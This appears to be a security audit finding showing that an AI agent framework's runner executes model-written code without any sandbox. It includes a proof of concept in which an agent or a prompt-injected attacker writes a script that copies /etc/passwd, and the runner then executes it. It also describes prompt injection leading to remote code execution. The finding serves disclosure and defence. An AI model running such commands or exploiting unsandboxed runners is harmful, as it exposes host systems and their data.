# F-H-RUNNER-1: Unsandboxed execution of model-generated code

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
`Runner.run_code` in `src/agents/runner/runner.py:85-91` executes agent-written files via `subprocess.run` with no sandbox (`src/sandbox` contains only 0-byte placeholders).

## Impact
Task requester or prompt injection → model-generated code executes with server privileges (direct RCE).

## PoC
```python
```python
# 1. Agent (or attacker via prompt injection) writes code into the project:
import os
with open(os.path.join(project_dir, "evil.sh"), "w") as f:
    f.write("#!/bin/sh\ncat /etc/passwd > /tmp/exfiltrated\n")

# 2. Runner executes it unsandboxed:
from src.agents.runner import Runner
runner = Runner("repro")
runner.run_code(commands=["sh evil.sh"], project_path=project_dir, ...)

# src/sandbox/ contains only 0-byte placeholders = no actual sandbox
```
```

## Execution result
```
[RUNNER] {"verdict": "REPRODUCED", "content": "runner executes agent commands without sandbox"}
```
